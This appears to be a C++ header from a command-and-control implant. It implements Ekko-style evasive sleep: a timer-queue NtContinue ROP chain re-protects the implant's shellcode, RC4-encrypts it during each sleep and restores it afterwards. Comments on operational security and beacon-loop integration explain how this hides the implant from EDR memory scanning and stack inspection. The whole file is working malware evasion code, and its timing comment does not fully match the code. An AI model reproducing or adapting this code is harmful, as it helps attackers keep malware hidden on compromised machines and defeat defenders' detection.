/*
 * mask_ekko.h — Ekko-style evasive sleep with full image encryption.
 *
 * Based on the Ekko technique (Cracked5pider) and Nighthawk (MDSec).
 * Uses CreateTimerQueueTimer + NtContinue ROP chain to:
 *   1. VirtualProtect the shellcode region to RW
 *   2. RC4-encrypt the entire shellcode image (SystemFunction032)
 *   3. Sleep for the specified duration
 *   4. RC4-decrypt the image (SystemFunction032 is symmetric)
 *   5. VirtualProtect back to RX
 *   6. Signal the event to resume
 *
 * The encryption/decryption and memory protection changes happen
 * from a TIMER QUEUE THREAD, not the agent's thread. This means:
 *   - The agent thread's call stack is clean during sleep
 *   - VirtualProtect is called from a system thread, not shellcode
 *   - Combined with Draugr stack spoofing, the agent thread shows
 *     a legitimate call stack while fully encrypted
 *
 * REQUIREMENTS:
 *   - x64 only (uses CONTEXT structure with Rip/Rcx/etc.)
 *   - NtContinue, SystemFunction032 must be resolvable from ntdll
 *   - CreateTimerQueueTimer, CreateEventA, VirtualProtect from kernel32
 *   - inst.evasion.ekko fields must be initialized
 *
 * OPSEC:
 *   + Entire shellcode image encrypted (RC4) during sleep — not just XOR
 *   + Memory protection changes come from system timer thread
 *   + Agent thread call stack is clean (combined with Draugr)
 *   + No VirtualProtect calls traceable to shellcode
 *   - CreateTimerQueueTimer with NtContinue is a known Ekko signature
 *   - Timer queue callbacks executing VirtualProtect + SystemFunction032
 *     in sequence is a detectable behavioral pattern
 *   - Some EDRs hook NtContinue specifically for this pattern
 *   - CFG-protected processes may block NtContinue as timer callback
 *
 * INTEGRATION:
 *   This replaces the entire sleep cycle — not just pre/post sleep.
 *   Replace the sleep call in main.cc's beacon loop with ekko_sleep().
 *   The function handles masking, sleeping, and unmasking internally.
 *
 * STRUCT ADDITIONS (add to ekko struct in common.h):
 *   PVOID nt_continue;          // resolved NtContinue
 *   PVOID system_function_032;  // resolved SystemFunction032
 *   PVOID virtual_protect;      // resolved VirtualProtect
 */

/* USTRING for SystemFunction032 */
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *fn_NtContinue)( PCONTEXT, BOOLEAN );
typedef NTSTATUS (NTAPI *fn_SystemFunction032)( USTRING*, USTRING* );

/*
 * ekko_sleep — Evasive sleep with full-image RC4 encryption.
 *
 * Replaces the standard NtDelayExecution sleep call.
 * The agent thread sleeps while the shellcode image is encrypted.
 *
 * Parameters:
 *   inst     — agent instance
 *   time_ms  — sleep duration in milliseconds
 */
auto declfn ekko_sleep( instance& inst, DWORD time_ms ) -> void {
    if ( !inst.evasion.ekko.initialized ) {
        /* Fallback to normal sleep if ekko not initialized */
        LARGE_INTEGER delay;
        delay.QuadPart = -((LONGLONG)time_ms * 10000);
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        return;
    }

    typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef HANDLE (WINAPI *fn_CreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
    typedef HANDLE (WINAPI *fn_CreateTimerQueue)(void);
    typedef BOOL (WINAPI *fn_CreateTimerQueueTimer)(
        PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
    typedef BOOL (WINAPI *fn_DeleteTimerQueue)(HANDLE);
    typedef DWORD (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
    typedef void (WINAPI *fn_RtlCaptureContext)(PCONTEXT);

    /* Resolve APIs */
    auto k32 = inst.kernel32.handle;
    auto ntd = inst.ntdll.handle;

    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        resolve::_api( k32, expr::hash_string( "VirtualProtect" ) ) );
    auto pCreateEventA = reinterpret_cast<fn_CreateEventA>(
        resolve::_api( k32, expr::hash_string( "CreateEventA" ) ) );
    auto pCreateTimerQueue = reinterpret_cast<fn_CreateTimerQueue>(
        resolve::_api( k32, expr::hash_string( "CreateTimerQueue" ) ) );
    auto pCreateTimerQueueTimer = reinterpret_cast<fn_CreateTimerQueueTimer>(
        resolve::_api( k32, expr::hash_string( "CreateTimerQueueTimer" ) ) );
    auto pDeleteTimerQueue = reinterpret_cast<fn_DeleteTimerQueue>(
        resolve::_api( k32, expr::hash_string( "DeleteTimerQueue" ) ) );
    auto pWaitForSingleObject = reinterpret_cast<fn_WaitForSingleObject>(
        resolve::_api( k32, expr::hash_string( "WaitForSingleObject" ) ) );

    auto pNtContinue = reinterpret_cast<fn_NtContinue>(
        resolve::_api( ntd, expr::hash_string( "NtContinue" ) ) );
    auto pSystemFunction032 = reinterpret_cast<fn_SystemFunction032>(
        resolve::_api( ntd, expr::hash_string( "SystemFunction032" ) ) );
    auto pRtlCaptureContext = reinterpret_cast<fn_RtlCaptureContext>(
        resolve::_api( ntd, expr::hash_string( "RtlCaptureContext" ) ) );

    if ( !pVirtualProtect || !pCreateEventA || !pCreateTimerQueue ||
         !pCreateTimerQueueTimer || !pDeleteTimerQueue || !pWaitForSingleObject ||
         !pNtContinue || !pSystemFunction032 || !pRtlCaptureContext ) {
        /* Fallback */
        LARGE_INTEGER delay;
        delay.QuadPart = -((LONGLONG)time_ms * 10000);
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        return;
    }

    /* Setup parameters */
    PVOID  image_base = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
    DWORD  image_size = inst.evasion.ekko.img_size;
    DWORD  old_protect = 0;

    /* RC4 key and image descriptors for SystemFunction032 */
    USTRING key_str = {};
    USTRING img_str = {};
    key_str.Buffer        = inst.evasion.ekko.rc4_key;
    key_str.Length         = 16;
    key_str.MaximumLength  = 16;
    img_str.Buffer        = image_base;
    img_str.Length         = image_size;
    img_str.MaximumLength  = image_size;

    /* Create synchronization event */
    HANDLE hEvent = pCreateEventA( nullptr, FALSE, FALSE, nullptr );
    HANDLE hTimerQueue = pCreateTimerQueue();

    if ( !hEvent || !hTimerQueue ) {
        LARGE_INTEGER delay;
        delay.QuadPart = -((LONGLONG)time_ms * 10000);
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        if ( hEvent ) inst.kernel32.CloseHandle( hEvent );
        if ( hTimerQueue ) pDeleteTimerQueue( hTimerQueue );
        return;
    }

    /* Capture current thread context for the ROP chain */
    CONTEXT ctx_thread  = {};
    CONTEXT ctx_prot_rw = {};
    CONTEXT ctx_encrypt = {};
    CONTEXT ctx_prot_rx = {};
    CONTEXT ctx_signal  = {};

    HANDLE hNewTimer = nullptr;

    /* Use RtlCaptureContext via timer to get a clean context */
    if ( !pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)pRtlCaptureContext, &ctx_thread,
            0, 0, WT_EXECUTEINTIMERTHREAD ) ) {
        inst.kernel32.CloseHandle( hEvent );
        pDeleteTimerQueue( hTimerQueue );
        return;
    }

    /* Wait for context capture */
    pWaitForSingleObject( hEvent, 50 );

    /* Build ROP chain contexts */

    /* Step 1: VirtualProtect( image_base, image_size, RW, &old_protect ) */
    memory::copy( &ctx_prot_rw, &ctx_thread, sizeof(CONTEXT) );
    ctx_prot_rw.Rsp -= 8;
    ctx_prot_rw.Rip  = reinterpret_cast<DWORD64>( pVirtualProtect );
    ctx_prot_rw.Rcx  = reinterpret_cast<DWORD64>( image_base );
    ctx_prot_rw.Rdx  = image_size;
    ctx_prot_rw.R8   = PAGE_READWRITE;
    ctx_prot_rw.R9   = reinterpret_cast<DWORD64>( &old_protect );

    /* Step 2: SystemFunction032( &img_str, &key_str ) — RC4 encrypt */
    memory::copy( &ctx_encrypt, &ctx_thread, sizeof(CONTEXT) );
    ctx_encrypt.Rsp -= 8;
    ctx_encrypt.Rip  = reinterpret_cast<DWORD64>( pSystemFunction032 );
    ctx_encrypt.Rcx  = reinterpret_cast<DWORD64>( &img_str );
    ctx_encrypt.Rdx  = reinterpret_cast<DWORD64>( &key_str );

    /* Step 3: VirtualProtect( image_base, image_size, RX, &old_protect ) */
    memory::copy( &ctx_prot_rx, &ctx_thread, sizeof(CONTEXT) );
    ctx_prot_rx.Rsp -= 8;
    ctx_prot_rx.Rip  = reinterpret_cast<DWORD64>( pVirtualProtect );
    ctx_prot_rx.Rcx  = reinterpret_cast<DWORD64>( image_base );
    ctx_prot_rx.Rdx  = image_size;
    ctx_prot_rx.R8   = PAGE_EXECUTE_READ;
    ctx_prot_rx.R9   = reinterpret_cast<DWORD64>( &old_protect );

    /* Step 4: SetEvent( hEvent ) — signal completion */
    memory::copy( &ctx_signal, &ctx_thread, sizeof(CONTEXT) );
    ctx_signal.Rsp -= 8;
    ctx_signal.Rip  = reinterpret_cast<DWORD64>(
        resolve::_api( k32, expr::hash_string( "SetEvent" ) ) );
    ctx_signal.Rcx  = reinterpret_cast<DWORD64>( hEvent );

    /*
     * Queue the ROP chain as timed callbacks:
     *
     * t=0:              VirtualProtect → RW
     * t=100ms:          SystemFunction032 → RC4 encrypt
     * t=200ms:          SystemFunction032 → RC4 decrypt (same key = undo)
     * t=200ms+sleep:    VirtualProtect → RX
     * t=300ms+sleep:    SetEvent → wake main thread
     *
     * The sleep duration is between encrypt and decrypt.
     */
    pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_prot_rw,
        100, 0, WT_EXECUTEINTIMERTHREAD );

    pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_encrypt,
        200, 0, WT_EXECUTEINTIMERTHREAD );

    /* Decrypt after sleep duration */
    pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_encrypt,
        200 + time_ms, 0, WT_EXECUTEINTIMERTHREAD );

    pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_prot_rx,
        300 + time_ms, 0, WT_EXECUTEINTIMERTHREAD );

    pCreateTimerQueueTimer( &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_signal,
        400 + time_ms, 0, WT_EXECUTEINTIMERTHREAD );

    /* Block until the ROP chain completes */
    pWaitForSingleObject( hEvent, INFINITE );

    /* Cleanup */
    inst.kernel32.CloseHandle( hEvent );
    pDeleteTimerQueue( hTimerQueue );
}
